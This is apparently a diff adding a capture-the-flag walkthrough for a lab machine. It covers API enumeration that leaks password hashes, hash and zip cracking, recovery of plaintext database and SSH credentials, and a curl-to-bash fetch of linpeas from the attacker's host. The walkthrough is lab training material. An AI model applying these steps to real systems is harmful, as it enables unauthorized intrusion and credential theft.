@@ -17,3 +17,48 @@ We continue to run an nmap full port scan : nmap -p- --min-rate 10000 10.10.10.5
 PORT     STATE SERVICE
 22/tcp   open  ssh
 3000/tcp open  ppp
+
+We visit the site at http://10.10.10.58:300/ we note three potential users on the webpage and so we view the source to see more.
+We note a couple of links to js scripts example <script type="text/javascript" src="assets/js/app/app.js"></script> and following each of them gives
+more leads. For example following the script on profiles http://10.10.10.58:3000/assets/js/app/controllers/profile.js we note an API route to return users
+and so we call it like http://10.10.10.58:3000/api/users and funny enough we get back:
+[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},
+{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},
+{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},
+{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
+
+We have a couple of potential usernames and hashes here that we will proceed and try to crack. And for the "username":"myP14ceAdm1nAcc0uNT" the admin flag
+is set to true. We head over to https://crackstation.net/ and attempt to crack the hashes, the results as below:
+myP14ceAdm1nAcc0uNT : manchester
+tom : spongebob
+mark : snowflake
+At this point we are thinking to try if any of these users can ssh in and if that fails then we can come back and login on the site. And sure enough, we don't
+get access over ssh but the myP14ceAdm1nAcc0uNT can login into the site and download a backup file. 
+
+wget --header "Cookie : connect.sid=s:Gd8YnPOoz-hqKSXaIymKfBpB_0lqKwIp.yp5SKz/WlHZ8N8TAHd1HevB8vZFHIXOAgxS5iIntX8I" http://10.10.10.58:3000/api/admin/backup
+====The file=====
+cat myplace.backup | base64 -d > backup.zip. Trying to unzip requires a password :
+unzip backup.zip 
+Archive:  backup.zip
+   creating: var/www/myplace/
+[backup.zip] var/www/myplace/package-lock.json password
+
+We don't know the password so we proceed to crack it.
+
+fcrackzip -uDp /usr/share/wordlists/rockyou.txt backup.zip 
+PASSWORD FOUND!!!!: pw == magicword
+
+Now we unzip the file successfully and we are able to access the backup (/var/www/). What is in my mind right now is to check for previous password or hash.
+And sure enough when we cat app.js we see the below snippet:
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
+Again my mind goes crazy to try to ssh in as mark with the password we just found and if that does not work try and port forward on 27017. Let's find out!
+No need to port knock anything am in as mark : 5AYRft73VtFpc84k !
+I cannot read the user flag as mark, what if I try to login as tom
+mark@node:/home/tom$ cat user.txt
+cat: user.txt: Permission denied
+I need a way to escalate privileges to tom. I like using the linux privilege escalation script to check what I can find. So I open up a local server
+python -m http.server and curl http://10.10.14.13:8000/linpeas.sh | bash
+
+
+ 
